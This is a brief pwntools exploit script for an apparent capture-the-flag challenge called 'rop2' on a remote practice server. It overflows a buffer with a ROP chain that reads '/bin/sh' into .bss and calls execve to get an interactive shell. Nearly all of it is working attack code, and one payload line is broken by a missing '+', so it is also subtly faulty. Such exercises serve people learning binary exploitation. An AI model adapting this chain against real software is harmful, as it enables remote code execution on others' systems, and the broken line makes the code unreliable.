from pwn import*
p = remote('hackme.inndy.tw',7703)
elf = ELF('./rop2')
bss = elf.bss()
syscall = elf.symbols['syscall']
overflow = elf.symbols['overflow']

p.recv()
payload = 'a'*0xC + 'bbbb' + p32(syscall) + p32(overflow)
payload += p32(3) + p32(0) + p32(bss) + p32(8)
p.send(payload)
p.send("/bin/sh\x00")

payload1 = 'a'*0xc + "BBBB" + p32(syscall)
payload1 += p32(overflow) p32(0xb) + p32(bss) + p32(0) + p32(0) 

p.send(payload1)

p.interactive()                      